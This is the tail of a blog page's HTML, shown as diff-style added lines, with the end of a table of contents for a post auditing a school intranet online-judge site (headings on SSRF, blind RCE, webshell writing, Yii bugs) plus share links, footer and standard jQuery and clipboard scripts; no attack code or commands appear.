<span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BERCE"><span class="toc-number">10.</span> <span class="toc-text">无回显RCE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpmyadmin%E5%90%8E%E5%8F%B0SQL%E5%86%99%E5%85%A5webshell-%E6%9F%A5%E7%9C%8B%E4%BB%BB%E6%84%8FSQL%E6%95%B0%E6%8D%AE"><span class="toc-number">11.</span> <span class="toc-text">phpmyadmin后台SQL写入webshell + 查看任意SQL数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#phpmyadmin%E4%BD%8E%E7%89%88%E6%9C%AC%E4%B8%80%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">phpmyadmin低版本一系列漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-%E5%86%99webshell"><span class="toc-number">13.</span> <span class="toc-text">SQL注入-写webshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Yii-1-1-12%E4%B8%80%E7%B3%BB%E5%88%97%E5%8E%86%E5%8F%B2%E6%A1%86%E6%9E%B6%E6%B4%9E"><span class="toc-number">14.</span> <span class="toc-text">Yii 1.1.12一系列历史框架洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%AF%B9php%E4%BB%A3%E7%A0%81%E6%89%8B%E5%B7%A5%E8%A7%A3%E6%B7%B7%E6%B7%86"><span class="toc-number">15.</span> <span class="toc-text">尝试对php代码手工解混淆</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5-2"><span class="toc-number">15.1.</span> <span class="toc-text">SQL注入_2</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&text=对本校内网刷题OJ网站的代码审计"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&is_video=false&description=对本校内网刷题OJ网站的代码审计"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=对本校内网刷题OJ网站的代码审计&body=Check out this article: http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&title=对本校内网刷题OJ网站的代码审计"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&name=对本校内网刷题OJ网站的代码审计&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/06/01/%E5%AF%B9%E6%9C%AC%E6%A0%A1%E5%86%85%E7%BD%91%E5%88%B7%E9%A2%98OJ%E7%BD%91%E7%AB%99%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-1/&t=对本校内网刷题OJ网站的代码审计"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2023
+    塔菲
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
